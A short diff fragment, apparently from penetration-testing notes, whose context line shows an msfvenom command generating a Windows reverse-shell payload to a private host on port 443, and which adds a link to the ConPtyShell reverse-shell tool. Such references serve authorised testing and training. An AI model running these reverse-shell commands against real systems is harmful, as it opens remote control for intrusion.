@@ -25,3 +25,5 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell
  return /a/;
 })();
 ```
+# Windows PowerShell
+https://github.com/antonioCoco/ConPtyShell
